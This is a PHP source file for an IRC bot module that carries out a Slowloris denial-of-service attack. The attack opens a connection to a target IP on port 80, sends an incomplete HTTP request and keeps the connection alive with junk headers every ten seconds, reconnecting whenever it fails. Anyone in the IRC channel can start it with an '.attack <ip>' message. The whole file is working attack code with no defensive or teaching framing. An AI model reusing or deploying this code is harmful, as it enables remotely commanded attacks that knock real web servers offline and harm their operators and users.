<?php
class DoS {
	private $IRCBot = null;
	private $attackIP = null;

	public function __construct(IRCBot $IRCBot) {
		$this->IRCBot = $IRCBot;
	}

	// i'll make more of these later.
	public function slowLoris($persistent = true, $maxFailedRequests = 5) { // i would make a class that extends this class, but i'm lazy today.
		$headers = "GET /" . md5(mt_rand()) . " HTTP/1.1\r\n";
		$headers .= "Host: " . $this->getAttackIP() . "\r\n";
		$headers .= "User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0\r\n";
		$headers .= "Keep-Alive: 1000\r\n";
		$headers .= "Content-Length: " . mt_rand(10000, 2000000) . "\r\n";
		$headers .= "Accept: *.*\r\n";
		
		$socket = @fsockopen($this->getAttackIP(), 80, $errnum, $errstr);
		if(!$socket) {
			throw new Exception($errstr);
		}
		fwrite($socket, $headers);
		$failedRequests = 0;
		if($maxFailedRequests < 0) {
			$maxFailedRequests = 0;
		}
		while($socket) {
			if(@fwrite($socket, "X-c: " . mt_rand(1, 10000) . "\r\n")) {
				sleep(10);
			} else {
				$failedRequests++;
				echo $failedRequests . ' failed attacks' . "\r";
				$socket = @fsockopen($this->getAttackIP(), 80, $errnum, $errstr);
				if(!$persistent && $failedRequests >= $maxFailedRequests) {
					throw new Exception($errstr);
				}
			}
		}

		echo "Done." . PHP_EOL;
	}

	public function EVENT_PRIVMSG(IRCBot $irc_bot, array $ds = null) {
		if($ds === null) {
			$ds = $irc_bot->getResultSet();
		}
		
		if(preg_match('/^\.attack/', $ds['trail'])) {
			$args = explode(' ', $ds);
			if(!isset($args[1])) {
				$this->usage();
				return false;
			}

			$this->setAttackIP($args[1]);
			$persistent = isset($args[2]) ? (bool) $args[2] : true;
			$maxFailedRequests = isset($args[3]) ? (int) $args[3] : 5;

			$this->slowLoris($persistent, $maxFailedRequests);
			echo 'Starting Slow Loris attack on ' . $ip;
		}
	}

	public function setAttackIP($attackIP) {
		$this->attackIP = $attackIP;
	}

	public function getAttackIP() {
		return $this->attackIP;
	}

	public function usage() {
		echo 'Usage: .attack <ip> [persistent=false] [max_attempts=5]' . PHP_EOL;
	}
}
?>
